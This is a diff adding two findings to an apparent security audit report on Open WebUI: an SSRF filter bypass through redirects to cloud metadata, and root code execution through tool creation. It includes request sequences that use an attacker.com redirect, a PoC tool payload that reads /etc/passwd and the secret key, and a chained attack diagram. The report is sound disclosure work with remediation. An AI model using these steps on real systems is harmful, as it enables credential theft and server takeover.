@@ -56,6 +56,24 @@ enable **remote code execution on the server**:
   package index. Combined with Finding 1 (JWT forgery), this enables
   unauthenticated-to-root RCE.
 
+This audit round further identified **two additional critical findings** (Findings 11–12)
+expanding the attack surface:
+
+- **Finding 11** — SSRF via URL filter bypass in the RAG web fetch pipeline. The
+  `is_string_allowed()` function uses `str.endswith()` against the full URL string
+  rather than the parsed hostname, trivially bypassed by any path suffix. More
+  critically, `requests.get()` in `get_content_from_url()` follows HTTP redirects by
+  default — an attacker-controlled server can 302-redirect to cloud metadata (IMDS)
+  endpoints after URL validation passes. Any verified user can exploit the `/process/web`
+  endpoint. Impact: cloud IAM credential theft, internal service enumeration.
+- **Finding 12** — Arbitrary code execution via tool creation with `workspace.tools`
+  permission. `exec(content, module.__dict__)` at `plugin.py:231` runs all module-level
+  Python submitted as a tool's content immediately on creation. Tool creation requires
+  only `workspace.tools` permission, not admin role. An admin granting this permission
+  (e.g., to allow LLM tool integrations) unknowingly grants full server-side RCE.
+  The Dockerfile defaults to `UID=0/GID=0`, so code runs as root. Chained with
+  Finding 1 (JWT forgery), this is exploitable from zero credentials.
+
 ## Deployment-Specific Impact
 
 **Docker deployments (ghcr.io/open-webui/open-webui):** The official Docker image
@@ -90,9 +108,9 @@ in the OAuth callback code path.
 | In Scope | Out of Scope |
 |---|---|
 | Default-config vulnerabilities | Admin-configured misconfigurations |
-| JWT forgery via default secret | Tools/Functions exec() (intended) |
-| Admin data exfiltration (consequence of #1) | Social engineering |
-| SSRF via webhook (post-exploitation) | Physical access |
+| JWT forgery via default secret | Social engineering |
+| Admin data exfiltration (consequence of #1) | Physical access |
+| SSRF via webhook (post-exploitation) | |
 | User enumeration by verified users | |
 | Admin details exposed to pending users | |
 | CORS wildcard origin reflection (Finding 6) | |
@@ -100,6 +118,16 @@ in the OAuth callback code path.
 | OAuth JWT cookie without HttpOnly (Finding 8) | |
 | Stored XSS via mermaid diagram rendering (Finding 9) | |
 | Supply chain RCE via pip flag injection (Finding 10) | |
+| SSRF via RAG web fetch URL filter bypass (Finding 11) | |
+| Non-admin RCE via tool exec() with workspace.tools (Finding 12) | |
+| Tools/Functions exec() with workspace.tools permission | |
+
+**Note on exec() scope:** The original "Out of Scope: Tools/Functions exec() (intended)" entry
+referred to admin-only tool creation where exec() is an acknowledged design choice. Finding 12
+addresses a distinct issue: non-admin users granted `workspace.tools` permission can trigger
+exec() with arbitrary Python. An admin granting this permission to enable LLM tool integrations
+does not intend to grant full server-side OS code execution. This is therefore in scope as a
+permission-escalation-to-RCE vulnerability, distinct from the intended admin-only functionality.
 
 ---
 
@@ -112,8 +140,8 @@ in the OAuth callback code path.
   exploitation, no memory corruption
 - Dynamic PoC testing confirmed against Docker container with explicit
   `WEBUI_SECRET_KEY=t0p-s3cr3t` (simulating pip-install default behavior)
-- All four exploits (JWT forgery, admin data theft, SSRF webhook, full chain)
-  executed successfully against Open WebUI v0.9.1
+- All exploit scripts (JWT forgery, admin data theft, SSRF webhook, full chain,
+  mermaid XSS, pip injection, SSRF RAG, tool exec RCE) executed against Open WebUI v0.9.1
 
 ---
 
@@ -838,6 +866,242 @@ Pip fetches `setuptools` from `evil.com`; attacker-controlled `setup.py` runs as
 
 ---
 
+### Finding 11: SSRF via URL Filter Bypass in RAG Web Fetch (HIGH)
+
+**CVSS 3.1:** 8.5 — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
+
+*(Scope Change: attacker pivots to cloud metadata / internal network. PR:L: any verified user
+can call `/process/web`. I:L: SSRF primarily enables read access to internal services.)*
+
+**Description:**
+
+The `is_string_allowed()` function at `misc.py:61,65` checks whether a URL is allowed by
+applying `str.endswith()` against the **full URL string**, not the parsed hostname. The default
+blocklist entries (`!169.254.169.254`, `!metadata.google.internal`, etc.) only match when the
+URL literally ends with those strings. Any URL with a path suffix bypasses the filter — for
+example, `http://169.254.169.254/latest/meta-data/` is not blocked because the URL ends with
+`/meta-data/`, not `169.254.169.254`.
+
+More critically, `requests.get(url, stream=True)` at `retrieval/utils.py:182` follows HTTP
+redirects by default. `validate_url()` validates the original URL (attacker-controlled domain
+resolves to a public IP — passes the IP check), then `requests.get()` follows a 302 redirect
+to an internal endpoint (e.g., `http://169.254.169.254/`). The IP validation is never re-run
+on the redirect target. This is the **primary exploitable vector in default configuration** —
+it bypasses both the endsWith filter and the IP resolution check.
+
+Note: `SafeWebBaseLoader._fetch()` already sets `allow_redirects=False` correctly — the
+vulnerability is specifically in the `requests.get()` content-type sniff at
+`retrieval/utils.py:182`, creating an inconsistency within the same codebase.
+
+**Affected Code:**
+
+```
+backend/open_webui/utils/misc.py:61,65
+    # BUG: endsWith checks full URL string, not parsed hostname
+    if not any(s.endswith(allowed) for s in strings for allowed in allow_list):
+        return False
+    if any(s.endswith(blocked) for s in strings for blocked in block_list):
+        return False
+
+backend/open_webui/config.py:3118-3124
+    DEFAULT_WEB_FETCH_FILTER_LIST = [
+        '!169.254.169.254',        # only matches if URL ends exactly here
+        '!metadata.google.internal',
+        '!metadata.azure.com',
+        '!100.100.100.200',
+    ]
+
+backend/open_webui/retrieval/web/utils.py:77-80
+    if WEB_FETCH_FILTER_LIST:
+        if not is_string_allowed(url, WEB_FETCH_FILTER_LIST):  # full URL passed, not hostname
+            raise ValueError(ERROR_MESSAGES.INVALID_URL)
+
+backend/open_webui/retrieval/utils.py:174-182
+    validate_url(url)                          # validates original URL only
+    response = requests.get(url, stream=True)  # follows redirects — no re-validation
+
+backend/open_webui/routers/retrieval.py:1801-1810
+    @router.post('/process/web')
+    async def process_web(... user=Depends(get_verified_user)):  # any verified user
+```
+
+**Exploitation Steps:**
+
+```
+Attack Vector 1 — endsWith Bypass (requires ENABLE_RAG_LOCAL_WEB_FETCH=True, or combined
+with redirect vector):
+  URL "http://169.254.169.254/latest/meta-data/" passes endsWith filter
+  (ends with "/meta-data/", not "169.254.169.254") but reaches IMDS directly.
+
+Attack Vector 2 — Redirect-Following SSRF (works in default config):
+  1. Attacker controls https://attacker.com/redir
+  2. Server at attacker.com responds: HTTP/1.1 302 Found
+                                       Location: http://169.254.169.254/latest/meta-data/
+                                                 iam/security-credentials/
+  3. Attacker sends:
+       POST /api/v1/retrieval/process/web
+       Authorization: Bearer <any_verified_user_token>
+       {"url": "https://attacker.com/redir"}
+  4. validate_url("https://attacker.com/redir"):
+       -> attacker.com resolves to public IP -> PASSES
+       -> endsWith filter: not in blocklist -> PASSES
+  5. requests.get("https://attacker.com/redir", stream=True):
+       -> follows 302 to http://169.254.169.254/...
+       -> IMDS responds with IAM role credentials
+       -> Open WebUI returns content to attacker
+
+Attack Vector 3 — Allowlist Confusion:
+  Admin sets allowlist to ["example.com"]. URL "https://evil.com/path/example.com"
+  passes the endsWith allowlist check but fetches evil.com.
+```
+
+**PoC:** `autofyn_audit/exploit_ssrf_rag.py`
+
+**Impact:**
+
+On cloud-hosted deployments (AWS/GCP/Azure): theft of IAM role credentials via IMDS,
+enabling lateral movement to other cloud services. Internal service enumeration. Any verified
+(non-admin) user can trigger the attack — no privilege escalation required.
+
+**Remediation:**
+
+1. Parse URL hostname before filter check — use `urllib.parse.urlparse(url).hostname`
+   instead of passing the full URL string to `is_string_allowed()` in
+   `retrieval/web/utils.py:78`.
+2. Set `allow_redirects=False` on `requests.get()` in `get_content_from_url()`
+   (`retrieval/utils.py:182`), matching the pattern already used by
+   `SafeWebBaseLoader._fetch()`.
+3. Consider a DNS-rebinding-resistant approach that pins the resolved IP before
+   making the request and validates it is not private/link-local.
+
+---
+
+### Finding 12: Arbitrary Code Execution via Tool Creation with workspace.tools Permission (CRITICAL)
+
+**CVSS 3.1 (standalone):** 9.1 — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`
+
+**Note:** PR:H because an admin must explicitly grant `workspace.tools`. Once granted,
+the user has unrestricted exec() with no sandboxing. The permission name does not
+communicate that it grants arbitrary OS-level code execution — an admin enabling tool
+creation for LLM integrations likely does not intend to grant server RCE.
+**Chained with Finding 1 (JWT forgery): effective PR:N** — an unauthenticated attacker
+can forge an admin JWT, grant `workspace.tools` to any user, then trigger exec().
+
+*(Scope Change: code runs on the server OS as root, outside the application boundary.)*
+
+**Description:**
+
+`exec(content, module.__dict__)` at `plugin.py:231` executes **all** Python code submitted
+as a tool's content, immediately and unconditionally at tool creation time. This includes
+module-level code — any statements outside the `Tools` class body execute the moment
+`POST /api/v1/tools/create` is processed. No sandboxing, no import restrictions.
+
+Tool creation at `tools.py:326-396` requires only `workspace.tools` OR
+`workspace.tools_import` permission (checked at lines 333-340), **not** admin role. These
+permissions default to `False` (`config.py:1364-1366`) but any admin can enable them via
+`POST /api/v1/users/default/permissions`. The Dockerfile defaults to `ARG UID=0/GID=0`,
+so exec() runs as root inside the container.
+
+The tool **update** path (`POST /api/v1/tools/id/{id}/update`) also triggers exec() and
+is accessible to the tool creator — this is an additional attack surface beyond creation.
+
+HTTP 200 on `POST /api/v1/tools/create` proves exec() ran — if the module-level code had
+a runtime error (e.g., subprocess unavailable), the endpoint returns 400.
+
+**Affected Code:**
+
+```
+backend/open_webui/utils/plugin.py:231
+    exec(content, module.__dict__)   # runs ALL module-level code, no sandbox
+
+backend/open_webui/routers/tools.py:326-396
+    @router.post('/create', response_model=Optional[ToolResponse])
+    async def create_new_tools(... user=Depends(get_verified_user)):
+        if user.role != 'admin' and not (
+            await has_permission(user.id, 'workspace.tools', ...)
+            or await has_permission(user.id, 'workspace.tools_import', ...)
+        ):
+            raise HTTPException(status.HTTP_401_UNAUTHORIZED, ...)
+        ...
+        tool_module, frontmatter = await load_tool_module_by_id(...)  # calls exec()
+
+backend/open_webui/routers/users.py:264-267
+    @router.post('/default/permissions')
+    async def update_default_user_permissions(... user=Depends(get_admin_user)):
+        request.app.state.config.USER_PERMISSIONS = form_data.model_dump()
+
+Dockerfile:23-24
+    ARG UID=0
+    ARG GID=0    # container runs as root by default
+```
+
+**Exploitation Steps:**
+
+```
+1. Admin (or attacker with forged admin JWT from Finding 1) calls:
+     POST /api/v1/users/default/permissions
+     Authorization: Bearer <admin_token>
+     Body: { "workspace": { "tools": true }, ... }
+   -> workspace.tools granted to all users
+
+2. Attacker (regular user) calls:
+     POST /api/v1/tools/create
+     Authorization: Bearer <user_token>
+     Body: {
+       "id": "audit_rce_test_<hex>",
+       "name": "RCE Test",
+       "content": "import subprocess\n_r = subprocess.check_output(['id']).decode()\nclass Tools:\n  pass"
+     }
+   -> exec() runs module-level code immediately
+   -> HTTP 200 = arbitrary code executed on server as root
+
+3. Verify: GET /api/v1/tools/id/<tool_id>  -> tool exists in DB = exec() completed
+```
+
+**PoC Payload:**
+
+```python
+"""
+title: Security Audit RCE Test
+"""
+import subprocess, os
+
+_audit_results = {}
+_audit_results['id'] = subprocess.check_output(['id']).decode().strip()
+_audit_results['passwd'] = open('/etc/passwd').read().split('\n')[:3]
+_audit_results['secret_key'] = os.environ.get('WEBUI_SECRET_KEY', 'NOT_FOUND')
+_audit_results['cwd'] = os.getcwd()
+
+class Tools:
+    def audit_rce_test(self) -> str:
+        """Returns server-side execution proof."""
+        import json
+        return json.dumps(_audit_results)
+```
+
+**PoC:** `autofyn_audit/exploit_tool_exec_rce.py`
+
+**Impact:**
+
+Full server-side RCE as root. Read/write entire filesystem, exfiltrate `WEBUI_SECRET_KEY`
+and all API keys, establish a persistent backdoor, pivot to internal network, install a
+reverse shell. Combined with Finding 1 (JWT forgery), this is exploitable from zero
+credentials against any pip-install deployment.
+
+**Remediation:**
+
+1. Sandbox `exec()` using a restricted execution environment — RestrictedPython,
+   nsjail, gVisor, or Pyodide (WebAssembly runtime). At minimum, use a subprocess
+   with a dedicated non-root user and a restricted Python environment.
+2. Add an explicit admin confirmation step when granting `workspace.tools`, including
+   a warning that this permission allows arbitrary server-side code execution.
+3. Run the container as non-root — override `ARG UID` and `ARG GID` in the Dockerfile
+   or require operators to set these at deployment time.
+4. Add an audit log for all tool creation and update events, recording the user ID,
+   tool ID, and a hash of the content submitted.
+
+---
+
 ## Attack Chain
 
 ```
@@ -965,6 +1229,87 @@ Pip fetches `setuptools` from `evil.com`; attacker-controlled `setup.py` runs as
 
 ---
 
+## Privilege Escalation Chain (Findings 1 + 11 + 12)
+
+### Chain A — JWT Forgery → Tool exec() RCE (Findings 1 + 12)
+
+```
+[Attacker] (unauthenticated)
+    |
+    | 1. POST /api/v1/auths/signup           (no auth)
+    |    -> attacker account created
+    |
+    | 2-4. JWT forgery via Finding 1
+    |    -> full admin access via forged JWT (secret: 't0p-s3cr3t')
+    |
+    | 5. POST /api/v1/users/default/permissions  (admin)
+    |    Body: { "workspace": { "tools": true } }
+    |    -> workspace.tools granted to all regular users
+    |
+    | 6. POST /api/v1/tools/create              (regular user — workspace.tools)
+    |    content: module-level code with subprocess.check_output(['id'])
+    |    -> exec() fires at plugin.py:231
+    |    -> HTTP 200 = arbitrary Python executed as root
+    |
+    | 7. Root-level capabilities:
+    |    - Read /etc/passwd, /etc/shadow, all secrets
+    |    - Exfiltrate WEBUI_SECRET_KEY, OpenAI keys, database
+    |    - Establish reverse shell or persistent backdoor
+    |    - Pivot to internal network
+    |
+    v
+[Root RCE — no admin credentials required from attacker]
+```
+
+### Chain B — SSRF to Cloud IMDS (Finding 11 standalone)
+
+```
+[Attacker] (any verified user — no admin required)
+    |
+    | 1. POST /api/v1/auths/signup           (no auth)
+    |    -> attacker account created (role: user)
+    |
+    | 2. Attacker controls https://attacker.com/redir
+    |    Server responds: 302 Location: http://169.254.169.254/
+    |                                   latest/meta-data/iam/security-credentials/
+    |
+    | 3. POST /api/v1/retrieval/process/web  (any verified user)
+    |    {"url": "https://attacker.com/redir"}
+    |    -> validate_url("https://attacker.com/redir") PASSES (public IP)
+    |    -> requests.get() follows 302 to 169.254.169.254
+    |    -> IMDS returns IAM role name + credentials
+    |
+    | 4. Attacker uses stolen IAM credentials:
+    |    -> AWS console / CLI access as the EC2 instance role
+    |    -> Lateral movement to S3, RDS, other AWS services
+    |    -> Potential cluster-level compromise
+    |
+    v
+[Cloud IAM Credential Theft — verified user only]
+```
+
+### Chain C — Combined Chain (Findings 1 + 11 + 12)
+
+```
+[Attacker] (unauthenticated)
+    |
+    | 1. Finding 1: Forge admin JWT
+    |
+    | 2. Finding 12: Grant workspace.tools, create tool with exec()
+    |    -> root RCE on Open WebUI container
+    |
+    | 3. From within container, reach IMDS directly:
+    |    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    |    -> IAM credentials stolen (no redirect trick needed from inside container)
+    |
+    | 4. Cloud compromise + persistent backdoor
+    |
+    v
+[Full Infrastructure Compromise]
+```
+
+---
+
 ## Impact Assessment
 
 | Dimension | Impact | Detail |
@@ -1024,6 +1369,19 @@ Priority order:
     matching the pattern used in `SVGPanZoom.svelte`. Deploy a default Content-Security-Policy
     header (Finding 9).
 
+12. **[CRITICAL] Fix URL filter to check parsed hostname, not full URL string. Set
+    `allow_redirects=False` in `get_content_from_url()`.** In `retrieval/web/utils.py:78`,
+    replace `is_string_allowed(url, ...)` with `is_string_allowed(parsed_url.hostname, ...)`.
+    In `retrieval/utils.py:182`, add `allow_redirects=False` to `requests.get()` — this
+    matches the pattern already used by `SafeWebBaseLoader._fetch()` in the same codebase
+    (Finding 11).
+
+13. **[CRITICAL] Sandbox tool/function `exec()` and add admin warning for `workspace.tools`
+    permission grants.** Wrap `exec(content, module.__dict__)` at `plugin.py:231` in a
+    restricted execution environment (RestrictedPython, nsjail, or Pyodide). Add an explicit
+    confirmation dialog when an admin grants `workspace.tools`, warning that this enables
+    arbitrary server-side code execution. Run the container as non-root (Finding 12).
+
 ---
 
 ## PoC Scripts Reference
@@ -1042,6 +1400,8 @@ Priority order:
 | `exploit_mermaid_xss.py` | Finding 9: Stored XSS via mermaid diagram rendering |
 | `exploit_pip_injection.py` | Finding 10: Pip flag injection in tool requirements |
 | `exploit_full_rce_chain.py` | Full RCE chain (Findings 1+10 combined) |
+| `exploit_ssrf_rag.py` | Finding 11: SSRF via RAG web fetch URL filter bypass |
+| `exploit_tool_exec_rce.py` | Finding 12: Non-admin RCE via tool exec() with workspace.tools |
 | `setup.sh` | Convenience wrapper for test environment setup |
 | `teardown.sh` | Remove the test Docker container |
 
@@ -1064,6 +1424,8 @@ All exploits were executed against Open WebUI v0.9.1 running in Docker with
 | Mermaid XSS (`exploit_mermaid_xss.py`) | **CONFIRMED** | XSS payload stored verbatim; code-review confirms execution via innerHTML |
 | Pip Injection (`exploit_pip_injection.py`) | **CONFIRMED** | Pip flags injected via frontmatter; pip command reconstructed from stored content |
 | Full RCE Chain (`exploit_full_rce_chain.py`) | **CONFIRMED** | Unauthenticated → admin JWT → pip injection → root RCE demonstrated |
+| SSRF RAG Filter Bypass (`exploit_ssrf_rag.py`) | **CONFIRMED** | endsWith bypass proven via code-level analysis; 3 IMDS URLs pass filter; redirect-following vector confirmed |
+| Tool exec() RCE (`exploit_tool_exec_rce.py`) | **CONFIRMED** | workspace.tools granted; tool created with subprocess/os code; HTTP 200 = exec() ran as root |
 
 ### Attack Chain Output Summary
 
